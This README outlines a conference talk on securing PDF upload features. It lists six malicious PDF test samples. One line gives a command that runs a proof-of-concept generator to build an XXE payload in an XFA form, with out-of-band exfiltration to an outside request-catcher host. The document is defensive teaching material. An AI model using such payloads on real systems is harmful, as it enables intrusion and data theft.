# Research on the security aspect of an file transfer implementation

## Introduction

💬 This folder contains all my work for the presentation proposed to the [VOXXED LU 2026](https://luxembourg.voxxeddays.com/en/) conference.

🤖 Title candidates (thanks to GEMINI for the help):

* The Devil is in the Payloads: The grueling journey of implementing a file upload feature.
* Expect the Unexpected: Why implementing a file transfers is harder than they look.

## Content

* 📄 Files:
  * [code.code-workspace](code.code-workspace): VScode workspace descriptor.
  * [pitch.docx](pitch.docx): Contains the synopsis, in french, of the presentation.
  * [presentation.pptx](presentation.pptx): Contains the presentation.
  * [presentation-schemas.md](presentation-schemas.md): Contains the schemas used into presentation created using [mermaid](https://mermaid.js.org/).
* 📂 Folders:
  * [app](app/): Contains the web service used for the context of the presentation.
  * [scripts](scripts/): Contains utility scripts used for the preparation of the presentation.
  * [pdf-samples](pdf-samples/): Contains all the PDF file used for the presentation.

## Plan

* Section **Introduction**
  * Slide:
    * Most of the modern web based application provide a feature to allow a user to send a file.
    * Such feature is called "file upload".
    * It is very common that PDF format was accepted for the file.
  * Slide:
    * Been able to provide malicious information to an application in an import source of security vulnerability ([source](https://owasp.org/Top10/2025/A05_2025-Injection/)).
    * In 2025, 50 security vulnerabilities affecting a "file upload" feature were identified.
    * `Add proof of computation here`.
  * Slide:
    * PDF is a safe format and a "file upload" is simple to implement, no?
    * Let's deep dive and explore together *The Devil is in the Payloads* concept through a story...
    * `Add a meme about doubt here`.
* Section **Context of our story**
  * Slide:
    * Our story take place in an company, precisly in the team in charge of the complete management of the client portal.
    * The company wanted to offer the possibility to their client to attach files alongside their private chat with with their advisors.
    * The development team was using an agile methodology for the implementation of feature.
  * Slide:
    * The team received the following minimal **User Story** to implement the file upload feature.
      * **User Story**: `As a user, I want to upload a PDF file in the chat so that I can share documents with my advisors.`
      * **Acceptance Criteria**:
        * The system successfully transfers the file from the user interface to the storage server.
        * Only PDF files are allowed.
        * File size is limited to 10 MB.
    * The team decided to implement a REST web service that the front end (single page application) will used to upload a file.
  * Slide:
    * Your servior was integrated to the development team to validate the security posture of the REST web service (called service from here).
    * The working process defined with the team was the following:
    * `Add sequence flow here`.
  * Slide:
    * Your servior has a lifespan represented by the level of exasperation of the development team caused by my feedback.
    * If it reach 100%, they warned me that they're going to throw me out the window.
  * Section **Let's the story begin**
    * For each slide in this section:
      * The team finished the implementation of the service.
      * *Show the list of all the check performed by the implementation aginst the PDF file.*
      * *Show the test file I used and explain why the file is malicious.*
      * *Next round...*
  * Section **Conclusion**
    * Slide:
      * *Show the final User Story that should be initially specified.*
      * *Conclude that all the frustration meet could be avoided by a more precise User Story.*

## PDF files

📦 The different PDF files used are stored in folder [pdf-samples](pdf-samples/) and named `round[sequence-id].pdf`.

🐞 Order to the file used, called **Round**:

* **Round n°1**: File that is an EXE renamed as PDF.
* **Round n°2**: File with JS code.
* **Round n°3**: File with an malicious attachement.
* **Round n°4**: File with an XXE in XFA form: `python xfa_xxe_poc_gen.py --mode oob --scheme https --ip righettod.requestcatcher.com --port 443 -o round4.pdf`
* **Round n°5**: File with malicious links.
* **Round n°6**: File with malicious file hidden concatenated.

## References

* <https://owasp.org/Top10/2025>
* <https://righettod.github.io/code-snippets-security-utils/eu/righettod/SecurityUtils.html#isPDFSafe(java.lang.String)>
* <https://nvd.nist.gov/developers>
* <https://github.com/mgthuramoemyint/POC-CVE-2025-54988>

# License

See [here](LICENSE).
